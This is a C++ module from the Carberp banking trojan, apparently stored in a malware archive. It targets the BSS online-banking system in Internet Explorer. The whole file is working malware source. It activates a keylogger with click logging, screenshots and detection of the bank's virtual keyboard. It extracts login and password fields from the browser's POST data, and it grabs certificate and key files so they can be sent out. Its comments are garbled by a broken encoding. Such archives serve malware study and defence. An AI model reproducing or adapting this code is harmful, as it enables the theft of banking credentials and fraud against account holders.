/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */

#include <shlobj.h>
#include "GetApi.h"
#include "Strings.h"
#include "Memory.h"
#include "Utils.h"
#include "KeyLogSystems.h"
#include "FileGrabber.h"
#include "BotHTTP.h"


//#include "BotDebug.h"

namespace DBGBSSWEB
{
	#include "DbgTemplates.h"
}

#define DBGBSS DBGBSSWEB::DBGOutMessage<>

#define BSSWebModule //������� ��� ������ �������

namespace BSSWeb
{

    const static char BSS_SystemName[] = "bss";
	const static char BSS_DllName[]    = "bsi.dll";



    string *WorkHost;  // ��� ������ ��� ����������� �������� ������


	bool SystemAdded = false;
	PKeyLogSystem System = 0;
	PList hashKeys = 0; //������ ������ ������� ��� ���������
	CRITICAL_SECTION csHashKeys;

	//�������� ��������� ����� ����� � �������
	int FileIsKey( FileGrabber::ParamEvent* e )
	{
		//������� ��������� �� ��� ��������� ����
		DWORD hashFile =  STR::GetHash( e->fileName, 0, false );
		bool exists = true;
		pEnterCriticalSection(&csHashKeys);
		if( List::IndexOf( hashKeys, (LPVOID)hashFile ) < 0 )
		{
			List::Add( hashKeys, (LPVOID)hashFile );
			exists = false;
		}
		pLeaveCriticalSection(&csHashKeys);
		if( !exists )
		{
			DBGBSS( "BSS", "KeyFile: '%s'", e->fileName );
			//���� ������ : ����������� �����
			const char* p = e->fileName;
			while( *p && *p != ':' ) p++;
			if( *p == 0 ) //����� ���, ������ ������ ����� ������� �����
				p = e->fileName;
			else
				p++; //������� :
			//���������� ��������� ����� 
			while( *p == '\\' || *p == '/' ) p++;
			//��������� ��� ����� ��� ������
			m_lstrcpy( e->nameSend, "keys\\" );
			m_lstrcat( e->nameSend, p );
			return FileGrabber::SENDFILE;
		}
		return 0;
	}

	void Activeted(LPVOID Sender)
	{
		DBGBSS( "BSS", "Activeted" );

		hashKeys = List::Create();
		pInitializeCriticalSection(&csHashKeys);

		FileGrabber::Init(FileGrabber::CREATEFILEA /*| FileGrabber::CREATEFILEW*/ );
		FileGrabber::Receiver* rv = FileGrabber::CreateReceiver();
		rv->FuncReceiver = FileIsKey;
		rv->minSize = 16;
		rv->maxSize = 5120;
		rv->aw |= FileGrabber::FILEISBIN | FileGrabber::FILEISBASE64;
		rv->maska = "-BEGIN CERTIFICATE-*-END CERTIFICATE-";
		const char gifFormat[] = { 'G', 'I', 'F', 0 };
		const char pngFormat[] = { (char)0x89, 'P', 'N', 'G', 0 };
		FileGrabber::AddIgnoreBeg( rv, gifFormat ); //���������� ������ gif
		FileGrabber::AddIgnoreBeg( rv, pngFormat ); //���������� ������ png

		const DWORD ignoreExt[] =
			{ 0x1D36F0 /* tmp */, 0x1AB867 /* jpg */, 0x1CF4E7 /* sig */, 0x1D3C74 /* txt */,
			  0x1A71EF /* ico */, 0x1C3767 /* png */, 0 };
		const DWORD neededExt[] = //���� ����������� � ������ bss.cpp, ������� ���������� ����� ��� ���������� )
			{ 0x18F2F2, 0x1AF2F9, 0x1CF2E3, 0x1C3AE2, 0x18F96C, 0x1BF871, 0x193133, 0x1C32ED, 0x1CB2F1, 0
			};
		FileGrabber::AddIgnoreExt( rv, ignoreExt );
		FileGrabber::AddNeededExt( rv, neededExt );

		FileGrabber::AddReceiver(rv);

		System = (PKeyLogSystem)Sender;
	}

	void Deactiveted(LPVOID Sender)
	{
		DBGBSS( "BSS", "Deactiveted" );
		if( System )
		{
			FileGrabber::Release();
			List::Free(hashKeys);
			System = 0;
		}
	}

	//------------------------------------------------------------------------

	BOOL CALLBACK __CheckVKeyboardWnd(HWND Wnd, LPARAM FlagsPtr)
	{
		PCHAR Text = GetWndText(Wnd);
		if (Text == NULL)
			return TRUE;


		PDWORD Flags = (PDWORD)FlagsPtr;

		// �������� ��� ������
		DWORD Hash = CalcHash(Text);
		STR::Free(Text);

		if (Hash == 0xBDD8F46E /* ����� */)
			*Flags |= 1;
		else
		if (Hash == 0xF1E44B82 /* ������ */)
			*Flags |= 2;



		// ����� ���������� ����� �� ��� ��� ���� �� �����
		// ������ ����
        return *Flags != 3;
	}
	//------------------------------------------------------------------------

	void WndIsVirtualKeyboard(LPVOID Sender, HWND Wnd, LPVOID Data, bool &Filtrated)
	{
		// ������� ��������� �������� �� ���� �����
		// ����������� ����������
		DWORD Flags = 0;

		pEnumChildWindows(Wnd, __CheckVKeyboardWnd, (LPARAM)&Flags);

        Filtrated = Flags == 3;
	}
	//------------------------------------------------------------------------

	//������ ���������
	void InitKeyLogger()
	{
		DBGBSS( "BSS", "�������������� �������" );

		PKeyLogSystem S = KeyLogger::AddSystem(BSS_SystemName, PROCESS_HASH_IE);
		if( S != NULL )
		{
			SystemAdded = true;

			S->SendLogAsCAB = true;
			// ������������� ����� ������ � ����� ������� � �� ������ ����������
			// �������

			S->TimeMode    = KLG_TIME_MIN;
			S->TimeValue   = 5 * 60; // ������� ����� �������� ������� 5-�� �����
			S->MakeScreenShot = true;
			hashKeys = 0;

			S->OnActivate   = Activeted;
			S->OnDeactivate = Deactiveted;

			PKlgWndFilter F = KeyLogger::AddFilter(S, false, false, "Internet Explorer_Server", NULL, FILTRATE_SELF_WND, LOG_KEYBOARD, 5);
			F->LogClicks = true;
			F->MakeScreenShot = true;

			// ��������� ������ �������� ����������
			F = KeyLogger::AddFilter(S, true, false, "obj_STATIC", NULL, FILTRATE_PARENT_WND, LOG_MOUSE, 7);
			if (F != NULL)
				F->OnFiltrate = WndIsVirtualKeyboard;


			KeyLogger::ActivateSystem(S);
		}
	}
   	//------------------------------------------------------------------------

	void ProcessPostData(PHTTPRequestData Data)
	{
		// ������������ ���� ������
		if (Data->PostData == NULL)
			return;

		PCHAR Tmp = Data->PostData;
		PCHAR Login		= GetTextBetween(Tmp,  "<L>", "</L>" );
		PCHAR Password	= GetTextBetween(Tmp,  "<P>", "</P>" );

		if (Login != NULL && Password != NULL)
		{
        	PCHAR LB = "\r\n";
			PCHAR Buf = STR::New(11, LB, LB, "URL:", Data->URL, LB, "Login:", Login, LB, "Password:", Password, LB);

			KeyLogger::AddStrToBuffer((HWND)-1, Buf, 0);

            DBGBSS( "BSS", "��������� ������ ������� %s", Buf);

			STR::Free(Buf);
		}
		STR::Free(Login);
		STR::Free(Password);

    }

	//------------------------------------------------------------------------
	void WINAPI IEURLChanged(PKeyLogger Logger, DWORD EventID, LPVOID Data)
	{
		PCHAR URL = NULL;


		switch (EventID)
		{
			case KLE_IE_URL_CHANGED:        URL = (char*)Data; break;
			case KLE_INTERNET_WRITE_FILE:   URL = ((PHTTPRequestData)Data)->URL;
		}

		bool IsBSS = m_strstr(URL, BSS_DllName) > 0;

		//  ��������� �������
		if (!SystemAdded && IsBSS)
		{
        	DBGBSS( "BSS", "URL %s", URL );
			InitKeyLogger();
		}

		// �� ������� �������, ���� ���� ��������� �� ������ �������
		if (SystemAdded)
		{
			PKeyLogSystem S = KeyLogger::SystemByName(BSS_SystemName);

			if (S == NULL) return;

			switch (EventID)
			{
				case KLE_IE_URL_CHANGED:        S->Enabled = IsBSS; break;

				case KLE_INTERNET_WRITE_FILE:
					{
						// ������������� ���� ������
						KeyLogger::ActivateSystem(S);
						ProcessPostData((PHTTPRequestData)Data);
					}
			}
		}
	}

	//------------------------------------------------------------------------




	void Init()
	{
		//������������� ������� �� ����� ���� � ��
		SystemAdded = false;
		WorkHost = NULL;
		KeyLogger::ConnectEventHandler(KLE_IE_URL_CHANGED, IEURLChanged);
		KeyLogger::ConnectEventHandler(KLE_INTERNET_WRITE_FILE, IEURLChanged);
	}
}



//----------------------------------------------------------------------------
//  ��������� ���, ������� ���������� ��� ����� ��������������� ����� ���
//----------------------------------------------------------------------------

bool IsBSSDocument(PCHAR URL)
{
	if (BSSWeb::WorkHost == NULL)
		return false;


	return STR::Pos(URL, BSSWeb::WorkHost->t_str()) >= 0;
}


void AddBSSFile(PCHAR aURL, LPVOID Data, DWORD DataSize)
{
	// ��������� �����

	bool IsBSS = STR::Pos(aURL, (PCHAR)BSSWeb::BSS_DllName) >= 0;

	if (!IsBSS && !IsBSSDocument(aURL))
	{
    	// �� ������������ ��� ��������
        return;
    }


    TURLREC  URL;
	ClearStruct(URL);
	ParseURL(aURL, &URL, true);


	if (IsBSS)
	{
		// ���������� �����, ��� �������� ���������� ������
		if (BSSWeb::WorkHost != NULL)
			delete BSSWeb::WorkHost;
		BSSWeb::WorkHost = new string(URL.Host);
    }


	// ���������� ������� ��������
	string Path(MAX_PATH);

	pSHGetSpecialFolderPathA(NULL, Path.t_str(), CSIDL_APPDATA, TRUE);

	Path.CalcLength();

	Path += "\\BSS.V1\\";
	pCreateDirectoryA(Path.t_str(), NULL);

	// ���������� ��� �����
	string FileName = Path + URL.Document;

	// ���������� ������
	File::WriteBufferA(FileName.t_str(), Data, DataSize);


	ClearURL(&URL);
}
